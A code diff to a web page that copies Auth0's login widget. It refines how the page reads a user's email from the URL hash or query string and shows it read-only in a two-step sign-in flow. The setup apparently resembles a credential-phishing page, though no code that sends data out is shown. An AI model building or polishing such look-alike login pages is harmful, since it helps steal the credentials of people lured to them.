@@ -481,7 +481,7 @@
             cursor: default;
         }
 
-        /* ─── EMAIL DISPLAY (readonly) with clean "Sign in as" style ─── */
+        /* ─── EMAIL DISPLAY ─── */
         #email_display {
             color: #1a1a1a !important;
             font-weight: 500;
@@ -908,7 +908,7 @@
                                                     </div>
                                                     <div class="auth0-lock-pane-separator"></div>
 
-                                                    <!-- Email display with proper icon (no #) -->
+                                                    <!-- Email display with proper email icon (no #) -->
                                                     <div class="auth0-lock-input-block auth0-lock-input-email">
                                                         <div class="auth0-lock-input-wrap auth0-lock-input-wrap-with-icon">
                                                             <span class="email-icon-wrapper" aria-hidden="true">
@@ -977,7 +977,7 @@
 
             </div>
         </div>
-    </main> 
+    </main>
 
     <script>
         (function() {
@@ -1004,17 +1004,27 @@
 
             // ─── HELPERS ───
             function getEmailFromURL() {
+                // Try hash first (e.g., #email=user@example.com)
                 if (window.location.hash) {
-                    const hashParams = new URLSearchParams(window.location.hash.substring(1));
-                    const email = hashParams.get('email');
-                    if (email) return email;
+                    try {
+                        const hashParams = new URLSearchParams(window.location.hash.substring(1));
+                        const email = hashParams.get('email');
+                        if (email && email.trim() !== '') return email.trim();
+                    } catch (_) { /* ignore */ }
+
+                    // Fallback: regex to find email in the hash
                     const match = window.location.hash.match(
                         /[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/i
                     );
                     if (match) return match[0];
                 }
+
+                // Try query string (e.g., ?email=user@example.com)
                 const params = new URLSearchParams(window.location.search);
-                return params.get('email') || '';
+                const email = params.get('email');
+                if (email && email.trim() !== '') return email.trim();
+
+                return '';
             }
 
             function setLoading(loading) {
@@ -1081,7 +1091,7 @@
                         setLoading(false);
                         if (data.success) {
                             currentEmail = email;
-                            // Display email cleanly — no #, just the email with icon
+                            // Display email cleanly — no #, just the email
                             emailDisplay.value = email;
                             one.style.display = 'none';
                             two.style.display = 'block';
